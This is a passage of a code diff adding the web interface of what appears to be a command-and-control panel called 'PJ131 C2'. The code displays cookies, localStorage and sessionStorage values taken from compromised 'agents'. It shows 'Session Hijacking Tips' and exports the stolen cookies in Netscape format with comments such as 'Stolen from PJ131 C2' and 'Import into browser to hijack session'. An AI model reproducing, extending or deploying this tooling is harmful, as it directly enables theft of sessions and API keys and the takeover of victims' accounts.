+                                        ${cookie.secure ? '<span class="cookie-badge">🔒 Secure</span>' : ''}
+                                        ${cookie.http_only ? '<span class="cookie-badge">🚫 HTTP-Only</span>' : ''}
+                                        ${cookie.same_site ? `<span class="cookie-badge">🔗 ${cookie.same_site}</span>` : ''}
+                                    </div>
+                                </div>
+                            `;
+                        });
+                        
+                        content += `</div>`;
+                    });
+                    
+                    content += `</div>`;
+                }
+                
+                // localStorage section
+                const localStorage = storage.filter(s => s.storage_type === 'localStorage');
+                if (localStorage.length > 0) {
+                    content += `
+                        <div class="cookie-section">
+                            <div class="cookie-section-title">
+                                <span>💾</span>
+                                <span>Local Storage (${localStorage.length})</span>
+                            </div>
+                    `;
+                    
+                    localStorage.forEach(item => {
+                        const shortValue = item.value.length > 80 
+                            ? item.value.substring(0, 80) + '...' 
+                            : item.value;
+                        
+                        content += `
+                            <div class="cookie-item">
+                                <div class="cookie-name">${item.key}</div>
+                                <div class="cookie-value">${shortValue}</div>
+                            </div>
+                        `;
+                    });
+                    
+                    content += `</div>`;
+                }
+                
+                // sessionStorage section
+                const sessionStorage = storage.filter(s => s.storage_type === 'sessionStorage');
+                if (sessionStorage.length > 0) {
+                    content += `
+                        <div class="cookie-section">
+                            <div class="cookie-section-title">
+                                <span>🔐</span>
+                                <span>Session Storage (${sessionStorage.length})</span>
+                            </div>
+                    `;
+                    
+                    sessionStorage.forEach(item => {
+                        const shortValue = item.value.length > 80 
+                            ? item.value.substring(0, 80) + '...' 
+                            : item.value;
+                        
+                        content += `
+                            <div class="cookie-item">
+                                <div class="cookie-name">${item.key}</div>
+                                <div class="cookie-value">${shortValue}</div>
+                            </div>
+                        `;
+                    });
+                    
+                    content += `</div>`;
+                }
+                
+                // Tips section
+                content += `
+                    <div class="cookie-tip">
+                        <strong>💡 Session Hijacking Tips:</strong><br>
+                        • Session cookies can grant instant access without passwords<br>
+                        • API keys in localStorage = direct API access<br>
+                        • JWT tokens = API authentication<br>
+                        • Import cookies into browser to hijack active sessions
+                    </div>
+                    
+                    <button class="export-btn" onclick="exportCookiesForAgent(${agentId})">
+                        📥 Export Cookies (Netscape Format)
+                    </button>
+                `;
+                
+                modal.querySelector('#cookieContent').innerHTML = content;
+                
+                // Close on background click
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        modal.remove();
+                    }
+                });
+                
+            } catch (error) {
+                console.error('Error loading cookies:', error);
+                alert('Error loading cookie data');
+            }
+        }
+        
+        async function exportCookiesForAgent(agentId) {
+            try {
+                const response = await fetch(`/api/cookies/${agentId}`);
+                const cookies = await response.json();
+                
+                if (cookies.length === 0) {
+                    alert('No cookies to export');
+                    return;
+                }
+                
+                let cookieText = '# Netscape HTTP Cookie File\n';
+                cookieText += '# Stolen from PJ131 C2\n';
+                cookieText += '# Import into browser to hijack session\n\n';
+                
+                cookies.forEach(cookie => {
+                    const domain = cookie.domain || 'localhost';
+                    const flag = 'TRUE';
+                    const path = cookie.path || '/';
+                    const secure = cookie.secure ? 'TRUE' : 'FALSE';
+                    const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);
+                    const name = cookie.name;
+                    const value = cookie.value;
+                    
+                    cookieText += `${domain}\t${flag}\t${path}\t${secure}\t${expiration}\t${name}\t${value}\n`;
+                });
+                
+                const blob = new Blob([cookieText], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `pj131_pj131_cookies_agent_${agentId}.txt`;
+                a.click();
+                URL.revokeObjectURL(url);
+                
+                alert('✅ Cookies exported! Import into browser to hijack session.');
+                
+            } catch (error) {
+                console.error('Error exporting cookies:', error);
+                alert('Error exporting cookies');
+            }
+        }
+
+function debugSend() {
+            console.log('=== DEBUG SEND CLICKED ===');
+            
+            // Check modal state
+            const modal = document.getElementById('sendModal');
+            console.log('[1] Modal active:', modal.classList.contains('active'));
+            
+            // Check container
+            const container = document.getElementById('agentCheckboxes');
+            console.log('[2] Container exists:', !!container);
+            console.log('[3] Container HTML length:', container?.innerHTML.length);
+            
+            // Check all checkboxes
+            const allCheckboxes = document.querySelectorAll('#agentCheckboxes input[type="checkbox"]');
+            console.log('[4] Total checkboxes:', allCheckboxes.length);
+            
+            // Check checked checkboxes
+            const checkedCheckboxes = document.querySelectorAll('#agentCheckboxes input[type="checkbox"]:checked');
+            console.log('[5] Checked checkboxes:', checkedCheckboxes.length);
+            
+            // Show details
+            allCheckboxes.forEach((cb, i) => {
+                console.log(`  Checkbox ${i}: value=${cb.value}, checked=${cb.checked}`);
+            });
+            
+            // Get IDs
+            const agentIds = Array.from(checkedCheckboxes).map(cb => parseInt(cb.value));
+            console.log('[6] Agent IDs:', agentIds);
+            
+            console.log('=== NOW CALLING REAL SEND ===');
+            
+            // Call the real function
+            sendNotification();
+        }
+
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
